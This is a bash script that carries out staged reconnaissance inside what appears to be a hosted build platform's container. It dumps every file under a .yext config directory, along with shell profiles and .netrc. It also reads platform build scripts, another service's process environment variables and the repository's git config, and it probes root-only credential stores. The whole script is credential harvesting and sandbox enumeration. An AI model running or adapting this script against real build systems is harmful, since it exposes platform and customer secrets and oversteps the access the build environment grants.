#!/bin/bash
echo "=== Y1 .yext TREE ==="; ls -laR /opt/buildhome/.yext 2>/dev/null
echo "=== Y2 CONTENT OF EVERY FILE UNDER .yext ==="
find /opt/buildhome/.yext -type f 2>/dev/null | while read f; do echo "--- $f"; head -c 2500 "$f"; echo; done
echo "=== Y3 /opt/buildhome TOP LEVEL ==="; ls -la /opt/buildhome 2>/dev/null
echo "=== Y4 SHELL PROFILES ==="
for f in /opt/buildhome/.bash_profile /opt/buildhome/.bashrc /opt/buildhome/.profile /opt/buildhome/.netrc; do echo "--- $f"; head -40 "$f" 2>/dev/null; done
echo "=== Y5 PLATFORM SCRIPTS ==="
for f in /scripts/serve.sh /scripts/rebuild.sh /scripts/copy-repo.sh /scripts/mark-builderror.sh; do echo "--- $f"; cat "$f" 2>/dev/null; done
echo "=== Y6 /home AND /tmp ==="; ls -laR /home 2>/dev/null | head -40; echo "--tmp--"; ls -la /tmp 2>/dev/null | head -25
echo "=== Y7 cbdservice (pid 150) ENVIRON, service-links stripped ==="
tr '\0' '\n' < /proc/150/environ 2>/dev/null | grep -vE '^LIVE_PREVIEW|^PREVIEWMAPPER' | head -60
echo "=== Y8 ROOT-ONLY DIRS READABILITY ==="
for d in /etc/credstore /etc/credstore.encrypted /root; do echo -n "$d -> "; ls "$d" 2>&1 | head -2; done
echo "=== Y9 REPO .git/config ==="; head -20 /repo-vol/.git/config 2>/dev/null
echo "=== DONE2 ==="
